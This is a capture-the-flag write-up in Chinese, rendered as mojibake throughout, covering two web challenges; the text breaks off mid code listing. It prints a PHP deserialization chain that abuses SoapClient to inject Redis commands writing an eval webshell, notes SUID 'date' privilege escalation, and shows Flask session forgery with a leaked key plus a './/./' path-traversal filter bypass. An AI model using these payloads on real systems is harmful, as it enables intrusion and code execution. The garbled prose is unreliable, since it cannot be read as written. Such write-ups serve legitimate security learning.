<p>ä¹Ÿæ˜¯ä¸ªååºåˆ—åŒ–ï¼Œæˆ‘ä»¬æ¥å…ˆå¾—åˆ°hintï¼Œç¼–å†™POPï¼š<br><code>?hello=O:4:&quot;hint&quot;:1:&#123;s:4:&quot;hint&quot;;s:14:&quot;/var/www/html/&quot;;&#125;</code><br>å°tips(file_get_contentsè¦ç”¨ç»å¯¹è·¯å¾„ï¼‰<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669910744361-6a1b78a1-92dd-405c-a666-5fad9c30b8b6.png#averageHue=%23fdfcfc&clientId=uc4ada6c8-01df-4&from=paste&height=76&id=u4856d0ef&name=image.png&originHeight=95&originWidth=731&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4392&status=done&style=none&taskId=u80f716f7-2524-4e7f-8656-d13e72d79a3&title=&width=584.8" alt="image.png"><br>å¾—åˆ°äº†ä¸€å¥è¯çŒœæµ‹ä¸ºredisæ•°æ®åº“çš„å¯†ç <br>ç„¶åå°±æ˜¯ç›´æ¥æ‰“äº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1:6379&quot;</span>;</span><br><span class="line"><span class="variable">$option</span> = <span class="keyword">array</span>(<span class="string">&quot;location&quot;</span>=&gt;<span class="variable">$target</span>,<span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;hello\r\nAUTH 20220311\r\nCONFIG SET dir /var/www/html\r\nSET x &#x27;&lt;?@eval(\$_POST[1]);?&gt;&#x27;\r\nCONFIG SET dbfilename boogipop.php\r\nSAVE\r\nhello&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wllm = <span class="string">&quot;SoapClient&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arsenetang = Null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">swpu</span>();</span><br><span class="line"><span class="variable">$aa</span>-&gt;l61q4cheng = <span class="variable">$option</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>));</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ‰§è¡Œä¹‹åèšå‰‘ä¸Šå·ï¼Œå‘ç°flagæ–‡ä»¶æ²¡æƒé™è¯»å–ï¼Œè‚¯å®šéœ€è¦ææƒï¼Œåœ¨binç›®å½•ä¸‹æ‰¾äº†ä¸€ä¸‹æœ‰sæƒé™çš„å‘½ä»¤ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669913773407-b9dd86e1-44e8-4c2c-b3d2-0764f7c1f81c.png#averageHue=%231d1b1b&clientId=u7cedd422-abeb-4&from=paste&height=84&id=u7122a233&name=image.png&originHeight=105&originWidth=495&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10668&status=done&style=none&taskId=u6abfa0d2-7db2-404c-881a-4ace7e854c8&title=&width=396" alt="image.png"><br>å‘ç°æœ‰ä¸ª<code>date</code>é‚£å°±ç”¨dateææƒå»è¯»å–flagäº†ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669913800723-0dbef0a2-b6b8-466f-86da-e6f1648a45d8.png#averageHue=%23161414&clientId=u7cedd422-abeb-4&from=paste&height=33&id=u2b0f07f6&name=image.png&originHeight=41&originWidth=624&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5216&status=done&style=none&taskId=uc10b02f1-8e6d-4fde-8169-5010ca1bb0e&title=&width=499.2" alt="image.png"></p>
<h2 id="BlogSystem"><a href="#BlogSystem" class="headerlink" title="BlogSystem"></a>BlogSystem</h2><p><a target="_blank" rel="noopener" href="https://pysnow.cn/category/code/">https://pysnow.cn/category/code/</a><br>è€ƒç‚¹:yamlååºåˆ—åŒ–,JWTä¼ªé€ ,ä»»æ„æ–‡ä»¶ä¸‹è½½<br>å‡ºé¢˜äººï¼šPysnow<br>çœ‹åˆ°è¿™ä¸ªå‡ºé¢˜äººè¿˜æ˜¯æŒºéœ‡æƒŠçš„ï¼Œå› ä¸ºå‰é˜µå­å°±å’Œä»–äº¤æµè¿‡ï¼ŒåŸæ¥æ˜¯å¤§ä½¬å—ï¼snowå¸ˆå‚…tqlï¼</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669991806937-99dd8f9e-e71e-496c-8bd7-630e0eb1f233.png#averageHue=%23344964&clientId=u1be9202c-6402-4&from=paste&height=254&id=u96f1003e&name=image.png&originHeight=318&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=832387&status=done&style=none&taskId=u2ccffcf6-8e33-46d0-9bb2-ab03e2ad99d&title=&width=1536" alt="image.png"><br>ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä¼šå‘ç°adminæ— æ³•æ³¨å†Œï¼Œé‚£ä¹Ÿå°±æ˜¯è¦æˆ‘ä»¬å¾—åˆ°adminè´¦æˆ·ï¼Œæˆ‘ä»¬æ³¨å†Œæ™®é€šè´¦æˆ·åä¼šè¿”å›ä¸€ä¸ªsessionidï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669991861000-a0b73ad1-19cb-4e6e-86fe-2ea30ed037b1.png#averageHue=%23edeeef&clientId=u1be9202c-6402-4&from=paste&height=62&id=u95539249&name=image.png&originHeight=78&originWidth=822&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5430&status=done&style=none&taskId=u41a862a7-0965-45c8-8661-bc43c19c367&title=&width=657.6" alt="image.png"><br>çœ‹ä¸€çœ¼å°±çŸ¥é“æ˜¯JWT,é‚£æˆ‘ä»¬ç°åœ¨è¦çŸ¥é“çš„å°±æ˜¯keyäº†ï¼Œåœ¨åšå®¢å‘ç°äº†pysnowå¸ˆå‚…ä¸€å…±å‘äº†ä¸‰ç¯‡æ–‡ç« ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669991895273-ca748bc7-2dac-42f6-8767-0f024ca13eb0.png#averageHue=%23fbfaf9&clientId=u1be9202c-6402-4&from=paste&height=376&id=u75d8a68d&name=image.png&originHeight=470&originWidth=1566&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98782&status=done&style=none&taskId=u9ebace79-5f28-4fa8-8060-a0ef230acec&title=&width=1252.8" alt="image.png"><br>åœ¨flaskåŸºç¡€æ€»ç»“å‘ç°äº†å¯ç–‘çš„keyï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669991990887-2dee4a1e-06c8-422f-9a52-cfbf434a1b8b.png#averageHue=%23efeeec&clientId=u1be9202c-6402-4&from=paste&height=60&id=u0ff9d5a6&name=image.png&originHeight=75&originWidth=688&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7041&status=done&style=none&taskId=u1be41375-a724-4248-b1c8-04479d43733&title=&width=550.4" alt="image.png"><br>çŒœæµ‹è¿™ä¸ªå°±æ˜¯key<code>7his_1s_my_fav0rite_ke7</code>ï¼Œä¹‹åç”¨flask-session-managerå»ä¼ªé€ ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669992022747-142b1710-416c-46e9-86f3-e4b42df1ad58.png#averageHue=%233a4047&clientId=u1be9202c-6402-4&from=paste&height=171&id=ud5aaa626&name=image.png&originHeight=214&originWidth=1591&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37572&status=done&style=none&taskId=ubc5299a4-1ab1-476b-a686-21f2514beb6&title=&width=1272.8" alt="image.png"><br>ç„¶åå°±å¯ä»¥è·å¾—adminæƒé™ï¼Œä¹‹åä¼šå‘ç°å¤šäº†ä¸€ä¸ªdownloadåŠŸèƒ½ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669992067505-2d38e098-9540-4a7d-8001-a2a9bd001206.png#averageHue=%233d4350&clientId=u1be9202c-6402-4&from=paste&height=58&id=u96179609&name=image.png&originHeight=72&originWidth=666&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6540&status=done&style=none&taskId=u70af7f7b-8471-4645-a8cd-f457ee2f8e6&title=&width=532.8" alt="image.png"><br>è¿›å»çœ‹çœ‹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669992080567-c3a883c1-e1d9-430c-980e-b2b004a4b2f5.png#averageHue=%23161512&clientId=u1be9202c-6402-4&from=paste&height=606&id=u9f9be355&name=image.png&originHeight=758&originWidth=1824&originalType=binary&ratio=1&rotation=0&showTitle=false&size=186103&status=done&style=none&taskId=udfe16d8e-516b-4d04-afda-c1eea593c70&title=&width=1459.2" alt="image.png"><br>å¯çˆ±çš„å‹¾å‹¾ï¼Œçœ‹åˆ°æœ‰ä¸ªpathï¼ŒçŒœæµ‹ä¸ºæ–‡ä»¶è¯»å–ï¼Œè¿™è¾¹å°è¯•ç›®å½•ç©¿è¶Šï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669992106103-f34c5c21-1145-46cd-a967-edd8ad14dc45.png#averageHue=%23edd8ba&clientId=u1be9202c-6402-4&from=paste&height=126&id=ud0289743&name=image.png&originHeight=158&originWidth=1258&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11517&status=done&style=none&taskId=u965164b9-09e4-49e7-bbde-c062165031d&title=&width=1006.4" alt="image.png"><br>è¿”å›äº†ä¸ªè¿™ä¸ªï¼Œå¯æ˜¯æˆ‘ä»¬æ˜æ˜è¯·æ±‚äº†<code>../</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æœ‰è¿‡æ»¤ï¼Œæˆ‘ä»¬çš„<code>..</code>è¢«æ›¿æ¢ä¸ºäº†ç©ºï¼Œå†æ¬¡å°è¯•ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669992168938-40f0198c-61ca-47fa-bc53-c5316edb588d.png#averageHue=%23fdfaf3&clientId=u1be9202c-6402-4&from=paste&height=440&id=u513d0c73&name=image.png&originHeight=550&originWidth=1678&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58207&status=done&style=none&taskId=u2343806e-9468-4986-bbec-29c1df9bf75&title=&width=1342.4" alt="image.png"><br>å‘ç°<code>//</code>ä¹Ÿä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œåˆ°è¿™é‡Œæ€è·¯æ¸…æ™°å°±åˆ©ç”¨<code>.//./</code>å®ç°ç»•è¿‡ï¼Œå»ç›®å½•ç©¿è¶Šï¼Œå¯ä»¥è¯»åˆ°app.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(config)</span><br><span class="line">app.secret_key = <span class="string">&#x27;7his_1s_my_fav0rite_ke7&#x27;</span></span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> view <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app.register_blueprint(index, name=<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">app.register_blueprint(blog, name=<span class="string">&#x27;blog&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.context_processor</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_statue</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            user = User.query.<span class="built_in">filter</span>(User.username == username).first()</span><br><span class="line">            <span class="keyword">if</span> user:</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&#x27;name&#x27;</span>: user.name, <span class="string">&#x27;password&#x27;</span>: user.password&#125;</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> e</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>ç„¶åå¯ä»¥æ ¹æ®flaskçš„ç›®å½•ç»“æ„ï¼Œå»è¯»å–viewç›®å½•ä¸‹çš„ä¸€äº›æ–‡ä»¶ï¼Œè¯»å–__init__.py:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669992271420-d08c49af-3c84-43aa-9f35-a9ba658c0235.png#averageHue=%23e6cfb3&clientId=u1be9202c-6402-4&from=paste&height=138&id=u35ba2403&name=image.png&originHeight=173&originWidth=1260&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11609&status=done&style=none&taskId=u3bc0e246-f0f8-48c9-9167-1359bcd7d17&title=&width=1008" alt="image.png"><br>å‘ç°äº†2ä¸ªå¯ç–‘çš„å¯¼å…¥ç‚¹ï¼Œè¯»å–blog.pyå’Œindex.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, session, render_template, request, flash, redirect, url_for, Response, send_file</span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> check_password_hash</span><br><span class="line"><span class="keyword">from</span> decorators <span class="keyword">import</span> login_limit, admin_limit</span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">index = Blueprint(<span class="string">&quot;index&quot;</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            flash(<span class="string">&quot;è¯¥ç”¨æˆ·åå·²å­˜åœ¨&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user = User(username=username, name=name)</span><br><span class="line">            user.password_hash(password)</span><br><span class="line">            db.session.add(user)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            flash(<span class="string">&quot;æ³¨å†ŒæˆåŠŸï¼&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()</span><br><span class="line">        <span class="keyword">if</span> (user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>) <span class="keyword">and</span> (check_password_hash(user.password, password)):</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username</span><br><span class="line">            session.permanent = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index.hello&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;è´¦å·æˆ–å¯†ç é”™è¯¯&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&quot;/updatePwd&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        lodPwd = request.form.get(<span class="string">&quot;lodPwd&quot;</span>)</span><br><span class="line">        newPwd1 = request.form.get(<span class="string">&quot;newPwd1&quot;</span>)</span><br><span class="line">        newPwd2 = request.form.get(<span class="string">&quot;newPwd2&quot;</span>)</span><br><span class="line">        username = session.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()</span><br><span class="line">        <span class="keyword">if</span> check_password_hash(user.password, lodPwd):</span><br><span class="line">            <span class="keyword">if</span> newPwd1 != newPwd2:</span><br><span class="line">                flash(<span class="string">&quot;ä¸¤æ¬¡æ–°å¯†ç ä¸ä¸€è‡´ï¼&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                user.password_hash(newPwd2)</span><br><span class="line">                db.session.commit()</span><br><span class="line">                flash(<span class="string">&quot;ä¿®æ”¹æˆåŠŸï¼&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;åŸå¯†ç é”™è¯¯ï¼&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@admin_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):</span><br><span class="line">        path = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;//&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        path = os.path.join(<span class="string">&#x27;static/upload/&#x27;</span>, path)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">return</span> send_file(path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>, file=path)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>,</span><br><span class="line">                           yaml=<span class="string">&#x27;æ‰€è°“ã€æ¶ã€ï¼Œæ˜¯é‚£äº›åªä¸ºäº†è‡ªå·±ï¼Œåˆ©ç”¨å’Œè·µè¸å¼±è€…çš„å®¶ä¼™ï¼ä½†æ˜¯ï¼Œæˆ‘è™½ç„¶æ˜¯è¿™æ ·ï¼Œä¹ŸçŸ¥é“ä»€ä¹ˆæ˜¯ä»¤äººä½œå‘•çš„ã€æ¶ã€ï¼Œæ‰€ä»¥ï¼Œç”±æˆ‘æ¥åˆ¶è£ï¼&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index.hello&#x27;</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span 